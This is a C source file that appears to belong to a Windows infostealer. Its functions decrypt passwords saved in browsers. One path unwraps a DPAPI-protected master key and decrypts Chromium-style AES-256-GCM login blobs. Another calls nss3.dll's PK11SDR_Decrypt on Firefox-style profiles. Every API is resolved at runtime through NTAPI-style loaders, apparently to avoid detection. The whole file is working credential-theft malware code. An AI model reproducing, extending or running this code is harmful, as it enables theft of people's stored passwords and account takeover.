#include "./../../include/crypto.h"
#include "./../../include/global.h"

int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize) {
    // Prepare the UNICODE_STRING structure for the crypt32.dll library name
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"crypt32.dll"; // The DLL to load dynamically
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR)); // Set the length of the name
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR); // Account for null termination
    dllName.Buffer = dllNameBuffer; // Point to the name buffer

    ULONG dllCharacteristics = 0; // No special characteristics for loading the DLL
    PVOID moduleHandle = NULL; // To store the handle of the loaded DLL

    // Load crypt32.dll using NTAPI version of LoadLibrary
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    
    // Check if the DLL was loaded successfully, if not return error code -1
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL)
    {
        return -1;
    }

    // Prepare the ANSI_STRING structure for the function name "CryptStringToBinaryA"
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "CryptStringToBinaryA"; // The function to be loaded
    procName.Length = (USHORT)strlen(procNameBuffer); // Set the length of the function name
    procName.MaximumLength = procName.Length + 1; // Account for null termination
    procName.Buffer = procNameBuffer; // Point to the function name buffer

    PVOID CryptStringToBinaryAProcAddress = NULL; // To store the function's address

    // Get the address of the "CryptStringToBinaryA" function using NTAPI equivalent of GetProcAddress
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &CryptStringToBinaryAProcAddress);

    // Check if the function address was retrieved successfully, if not unload the DLL and return error code -2
    if (!NT_SUCCESS(STATUS1) || CryptStringToBinaryAProcAddress == NULL)
    {
        UnloadLib(moduleHandle); // Unload the library if function retrieval failed
        return -2;
    }

    // Cast the retrieved function address to the correct function pointer type
    CryptStringToBinaryFunc pCryptStringToBinary = (CryptStringToBinaryFunc)CryptStringToBinaryAProcAddress;

    DWORD cryptFlags = CRYPT_STRING_BASE64; // Specify that the input is Base64 encoded

    // First call to the function to determine the size of the decoded output buffer
    if (!pCryptStringToBinary(input, 0, cryptFlags, NULL, outputDecSize, NULL, NULL))
    {
        UnloadLib(moduleHandle); // Unload the DLL if the function fails
        return -4; // Return error code -4
    }

    // Allocate memory for the decoded output based on the size determined in the previous step
    *outputDec = (char *)HeapAlloc(GetProcessHeap(), HEAP_NO_SERIALIZE, (*outputDecSize) * sizeof(char));
    
    // If memory allocation fails, unload the DLL and return error code -5
    if (!*outputDec)
    {
        UnloadLib(moduleHandle); // Unload the DLL if allocation fails
        return -5;
    }

    // Second call to actually decode the Base64 input into the allocated output buffer
    if (!pCryptStringToBinary(input, 0, cryptFlags, (BYTE *)*outputDec, outputDecSize, NULL, NULL))
    {
        // If the decoding fails, free the allocated memory, unload the DLL, and return error code -6
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, *outputDec);
        UnloadLib(moduleHandle); // Unload the DLL if decoding fails
        return -6;
    }

    // Unload the crypt32.dll library after the decoding is done
    UnloadLib(moduleHandle);

    // Return 0 to indicate success
    return 0;
}
NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const BYTE *aad, ULONG aadLength, const BYTE *iv, ULONG ivLength, const BYTE *authTag, ULONG authTagLength, const BYTE *key, ULONG keyLength, BYTE *decryptedData, ULONG decryptedDataLength) {
    // Dynamically load bcrypt.dll using NTAPI equivalent of LoadLibrary.
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"bcrypt.dll"; // The DLL containing cryptographic functions
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR)); // Set length of DLL name
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR); // Account for null terminator
    dllName.Buffer = dllNameBuffer; // Set the buffer to point to the DLL name

    ULONG dllCharacteristics = 0; // No special characteristics for loading the DLL
    PVOID moduleHandle = NULL; // Handle for the loaded module

    // Load bcrypt.dll and check if it was loaded successfully.
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL)
    {
        return -1; // Return error if the DLL was not loaded
    }

    // Retrieve the address of BCryptOpenAlgorithmProvider function from bcrypt.dll.
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "BCryptOpenAlgorithmProvider";
    procName.Length = (USHORT)strlen(procNameBuffer); // Set function name length
    procName.MaximumLength = procName.Length + 1; // Account for null terminator
    procName.Buffer = procNameBuffer; // Set the buffer to point to the function name

    PVOID BCryptOpenAlgorithmProviderProcAddress = NULL; // Address for the function

    NTSTATUS STATUS0 = GetProcAdd(moduleHandle, &procName, 0, &BCryptOpenAlgorithmProviderProcAddress);
    if (!NT_SUCCESS(STATUS0) || BCryptOpenAlgorithmProviderProcAddress == NULL)
    {
        UnloadLib(moduleHandle); // Unload the DLL if function loading failed
        return -2; // Return error if unable to load the function
    }

    // Define function pointer for BCryptOpenAlgorithmProvider
    BCryptOpenAlgorithmProvider_t pBCryptOpenAlgorithmProvider = (BCryptOpenAlgorithmProvider_t)BCryptOpenAlgorithmProviderProcAddress;

    // Retrieve the address of BCryptSetProperty function from bcrypt.dll.
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "BCryptSetProperty";
    procName1.Length = (USHORT)strlen(procNameBuffer1); 
    procName1.MaximumLength = procName1.Length + 1; 
    procName1.Buffer = procNameBuffer1; 

    PVOID BCryptSetPropertyProcAddress = NULL; 
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName1, 0, &BCryptSetPropertyProcAddress);
    if (!NT_SUCCESS(STATUS1) || BCryptSetPropertyProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -3; 
    }

    BCryptSetProperty_t pBCryptSetProperty = (BCryptSetProperty_t)BCryptSetPropertyProcAddress;

    // Retrieve the address of BCryptGenerateSymmetricKey function from bcrypt.dll.
    ANSI_STRING procName2;
    CHAR procNameBuffer2[] = "BCryptGenerateSymmetricKey";
    procName2.Length = (USHORT)strlen(procNameBuffer2); 
    procName2.MaximumLength = procName2.Length + 1; 
    procName2.Buffer = procNameBuffer2; 

    PVOID BCryptGenerateSymmetricKeyProcAddress = NULL; 
    NTSTATUS STATUS2 = GetProcAdd(moduleHandle, &procName2, 0, &BCryptGenerateSymmetricKeyProcAddress);
    if (!NT_SUCCESS(STATUS2) || BCryptGenerateSymmetricKeyProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4; 
    }

    BCryptGenerateSymmetricKey_t pBCryptGenerateSymmetricKey = (BCryptGenerateSymmetricKey_t)BCryptGenerateSymmetricKeyProcAddress;

    // Retrieve the address of BCryptDecrypt function from bcrypt.dll.
    ANSI_STRING procName3;
    CHAR procNameBuffer3[] = "BCryptDecrypt";
    procName3.Length = (USHORT)strlen(procNameBuffer3); 
    procName3.MaximumLength = procName3.Length + 1; 
    procName3.Buffer = procNameBuffer3; 

    PVOID BCryptDecryptProcAddress = NULL; 
    NTSTATUS STATUS3 = GetProcAdd(moduleHandle, &procName3, 0, &BCryptDecryptProcAddress);
    if (!NT_SUCCESS(STATUS3) || BCryptDecryptProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4; 
    }

    BCryptDecrypt_t pBCryptDecrypt = (BCryptDecrypt_t)BCryptDecryptProcAddress;

    // Retrieve the address of BCryptDestroyKey function from bcrypt.dll.
    ANSI_STRING procName4;
    CHAR procNameBuffer4[] = "BCryptDestroyKey";
    procName4.Length = (USHORT)strlen(procNameBuffer4); 
    procName4.MaximumLength = procName4.Length + 1; 
    procName4.Buffer = procNameBuffer4; 

    PVOID BCryptDestroyKeyProcAddress = NULL; 
    NTSTATUS STATUS4 = GetProcAdd(moduleHandle, &procName4, 0, &BCryptDestroyKeyProcAddress);
    if (!NT_SUCCESS(STATUS4) || BCryptDestroyKeyProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4; 
    }

    BCryptDestroyKey_t pBCryptDestroyKey = (BCryptDestroyKey_t)BCryptDestroyKeyProcAddress;

    // Retrieve the address of BCryptCloseAlgorithmProvider function from bcrypt.dll.
    ANSI_STRING procName5;
    CHAR procNameBuffer5[] = "BCryptCloseAlgorithmProvider";
    procName5.Length = (USHORT)strlen(procNameBuffer5); 
    procName5.MaximumLength = procName5.Length + 1; 
    procName5.Buffer = procNameBuffer5; 

    PVOID BCryptCloseAlgorithmProviderProcAddress = NULL; 
    NTSTATUS STATUS5 = GetProcAdd(moduleHandle, &procName5, 0, &BCryptCloseAlgorithmProviderProcAddress);
    if (!NT_SUCCESS(STATUS5) || BCryptCloseAlgorithmProviderProcAddress == NULL)
    {
        UnloadLib(moduleHandle);
        return -4; 
    }

    BCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider = (BCryptCloseAlgorithmProvider_t)BCryptCloseAlgorithmProviderProcAddress;

    // Check if all required function addresses were loaded successfully.
    if (!BCryptGenerateSymmetricKeyProcAddress || !BCryptSetPropertyProcAddress || !BCryptGenerateSymmetricKeyProcAddress || !BCryptDecryptProcAddress || !BCryptDestroyKeyProcAddress || !BCryptCloseAlgorithmProviderProcAddress)
    {
        UnloadLib(moduleHandle); // Unload the DLL if any function is missing
        return -1; // Return error if one or more function addresses were not loaded
    }

    // Open the AES algorithm provider and initialize necessary handles.
    NTSTATUS status = 0;
    DWORD bytesDone = 0;
    BCRYPT_ALG_HANDLE algHandle = 0;
    status = pBCryptOpenAlgorithmProvider(&algHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status))
    {
        UnloadLib(moduleHandle); // Unload the DLL on failure
        return status; // Return error if provider couldn't be opened
    }

    // Set the algorithm's chaining mode to GCM (Galois/Counter Mode).
    status = pBCryptSetProperty(algHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status))
    {
        pBCryptCloseAlgorithmProvider(algHandle, 0); // Close the provider on failure
        UnloadLib(moduleHandle); // Unload the DLL
        return status; // Return error
    }

    // Generate a symmetric key for decryption using the provided key material.
    BCRYPT_KEY_HANDLE keyHandle = 0;
    status = pBCryptGenerateSymmetricKey(algHandle, &keyHandle, NULL, 0, (PUCHAR)key, keyLength, 0);
    if (!NT_SUCCESS(status))
    {
        pBCryptCloseAlgorithmProvider(algHandle, 0); // Close provider on failure
        UnloadLib(moduleHandle); // Unload the DLL
        return status; // Return error if key generation fails
    }

    // Initialize authenticated cipher mode information for GCM.
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv; // Set IV (nonce)
    authInfo.cbNonce = ivLength; // Set IV length
    authInfo.pbTag = (PUCHAR)authTag; // Set authentication tag
    authInfo.cbTag = authTagLength; // Set tag length
    authInfo.pbAuthData = (PUCHAR)aad; // Set additional authenticated data (AAD)
    authInfo.cbAuthData = aadLength; // Set AAD length

    // Decrypt the data using the symmetric key and GCM parameters.
    status = pBCryptDecrypt(keyHandle, (PUCHAR)encryptedData, encryptedDataLength, &authInfo, NULL, 0, decryptedData, decryptedDataLength, &bytesDone, 0);

    // Clean up: destroy the key and close the algorithm provider.
    pBCryptDestroyKey(keyHandle);
    pBCryptCloseAlgorithmProvider(algHandle, 0);
    UnloadLib(moduleHandle); // Unload the DLL once finished

    return status; // Return final status, success or failure
}
int AES_256_GCM_Setup(char *key, char *ciphertext, DWORD ciphertextSize, char *plaintext) {
    // Decode the key + remove DPAPI suffix from the start.
    char *Base64DecodedKey = NULL;
    DWORD Base64DecodedKeySize;
    Base64DecodingFunc(key, &Base64DecodedKey, &Base64DecodedKeySize);
    Base64DecodedKey += 5;
    Base64DecodedKeySize -= 5;

    // Start decrypting the secret key.
    DATA_BLOB input, output;
    input.pbData = (BYTE *)Base64DecodedKey;
    input.cbData = Base64DecodedKeySize;
    CRYPTPROTECT_PROMPTSTRUCT promptStruct;
    promptStruct.dwPromptFlags = CRYPTPROTECT_PROMPT_ON_UNPROTECT;
    promptStruct.hwndApp = NULL;
    promptStruct.szPrompt = NULL;
    promptStruct.cbSize = sizeof(CRYPTPROTECT_PROMPTSTRUCT);
    DWORD flags = CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_VERIFY_PROTECTION;

    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"crypt32.dll"; // Name of the DLL.
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID moduleHandle = NULL;
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (NT_SUCCESS(STATUS) || moduleHandle != NULL)
    {
        ANSI_STRING procName;
        CHAR procNameBuffer[] = "CryptUnprotectData";
        procName.Length = (USHORT)strlen(procNameBuffer);
        procName.MaximumLength = procName.Length + 1;
        procName.Buffer = procNameBuffer;
        PVOID CryptUnprotectDataProcAddress = NULL;
        NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &CryptUnprotectDataProcAddress);
        if (!NT_SUCCESS(STATUS1) || CryptUnprotectDataProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        CryptUnprotectDataFunc pCryptUnprotectData = (CryptUnprotectDataFunc)CryptUnprotectDataProcAddress;
        pCryptUnprotectData(&input, NULL, NULL, NULL, &promptStruct, flags, &output);
    } else {
        INFO("Something went wrong in loading crypt32.dll, can not decrypt DPAPI key.");
        return 1;
    }
    char *secret_key = output.pbData;
    int secret_keySize = output.cbData;

    char iv[13];
    for (int i = 0; i < 13; i++)
    {
        iv[i] = ciphertext[i + 3];
    }
    iv[12] = '\0';

    DWORD passwordSize = ciphertextSize - 15 - 16;
    char password[passwordSize + 1];
    for (int i = 0; i < passwordSize; i++)
    {
        password[i] = ciphertext[i + 15];
    }

    DWORD authTagSize = 16;
    char authTag[authTagSize];
    for (int i = 0; i < authTagSize; i++)
    {
        authTag[i] = ciphertext[i + (ciphertextSize - 16)];
    }

    BYTE aad[] = {};
    BYTE decryptedData[passwordSize];
    ULONG decryptedDataLength = passwordSize;
    
    NTSTATUS status = AES_256_GCM( password, passwordSize, aad, 0, iv, 12, authTag, authTagSize, secret_key, secret_keySize, decryptedData, decryptedDataLength);
    if (NT_SUCCESS(status))
    {

        decryptedData[decryptedDataLength] = '\0';
        strcpy(plaintext, decryptedData);
    }
    else
    {
        INFO("Decryption failed with status: %08x", status);
        return 1;
    }
    return 0;
}
int Decrypt_NSS3(char *profile_path, char *crypted, char **outcrypt) {
    // Load the nss3.dll file to use the NSS3 decryption functions.
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"nss3.dll";
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID moduleHandle = NULL;
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL) { WARN("Error occured in loading of nss3.dll"); return -1; }

    // Retrieve the address of the NSS_Init function from nss3.dll
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "NSS_Init";
    procName.Length = (USHORT)strlen(procNameBuffer);
    procName.MaximumLength = procName.Length + 1;
    procName.Buffer = procNameBuffer;
    PVOID NSS_InitProcAddress = NULL;
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName, 0, &NSS_InitProcAddress);
    if (!NT_SUCCESS(STATUS1) || NSS_InitProcAddress == NULL) { WARN("Error occured in getting address of NSS_Init"); UnloadLib(moduleHandle); return 1; }
    NSS_InitFunc* NSS_Init = (NSS_InitFunc*)NSS_InitProcAddress;

    // Retrieve the address of the PK11SDR_Decrypt function from nss3.dll
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "PK11SDR_Decrypt";
    procName1.Length = (USHORT)strlen(procNameBuffer1);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer1;
    PVOID PK11SDR_DecryptProcAddress = NULL;
    NTSTATUS STATUS2 = GetProcAdd(moduleHandle, &procName1, 0, &PK11SDR_DecryptProcAddress);
    if (!NT_SUCCESS(STATUS2) || PK11SDR_DecryptProcAddress == NULL) { WARN("Error occured in getting address of PK11SDR_Decrypt"); UnloadLib(moduleHandle); return 1; }
    PK11SDR_DecryptFunc* PK11SDR_Decrypt = (PK11SDR_DecryptFunc*)PK11SDR_DecryptProcAddress;

    // Initialize NSS.
    SECStatus result = NSS_Init(profile_path);
    if (result != SECSuccess) { WARN("NSS_Init returned non 0 integer..."); UnloadLib(moduleHandle); return 1; }

    // Base64 decode the encoded ciphertext.
    char *encrypted_data = NULL;
    DWORD dword_encrypted_data = 0;
    Base64DecodingFunc(crypted, &encrypted_data, &dword_encrypted_data);

    // Decrypt the ciphertext using NSS3.
    SECItem pInSecItem, pOutSecItem;
    pInSecItem.data = (unsigned char *)encrypted_data;
    pInSecItem.len = dword_encrypted_data;
    pOutSecItem.data = NULL;
    pOutSecItem.len = 0;
    SECStatus rv = PK11SDR_Decrypt(&pInSecItem, &pOutSecItem, NULL);
    if (pOutSecItem.data != NULL || (pOutSecItem.len != 0)) {
        char DecryptData[pOutSecItem.len + 1];
        size_t n = pOutSecItem.len;
        *outcrypt = malloc(n * sizeof(char));
        sprintf(*outcrypt, "%.*s\n", pOutSecItem.len, pOutSecItem.data);
        UnloadLib(moduleHandle);
        return 0;
    } else {
        WARN("Error occurred during decryption with status: %08x", rv);
        UnloadLib(moduleHandle);
        return 1;
    }
}
